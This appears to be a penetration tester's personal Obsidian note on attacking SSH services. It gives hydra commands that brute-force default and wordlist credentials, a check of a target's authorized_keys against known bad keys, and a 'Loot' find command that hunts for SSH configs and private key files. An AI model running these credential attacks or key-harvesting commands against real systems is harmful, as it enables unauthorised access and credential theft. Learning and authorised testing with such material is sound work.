#service 
<% tp.file.rename("1_SSH_")%>
☑️
#### Bad Keys
Get entries from targets `authorized_keys` file. Then:
```
auth_key="";grep -lr $auth_key /home/kali/Documents/SSHKeys/
```
#### Bruteforce default credentials
```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://$hip -V -t 4 -I -s 22
```
Or for a given user:
```bash
hydra -l $user -P /usr/share/wordlists/rockyou30.txt ssh://$hip -V -t 4 -I -s 22
```
(pass userlist with `-L /usr/share/wordlists/dirb/others/names.txt`)

> Tip: If SSH-Version of target is to low to connect to, try command „kali-tweaks“, select hardening, and toggle „SSH“.

# Loot
```bash
find / -name "ssh_config" -o -name "sshd_config" -o -name "authorized_keys" -o -name "ssh_known_hosts" -o -name ".shosts" -o -name "id_*"
```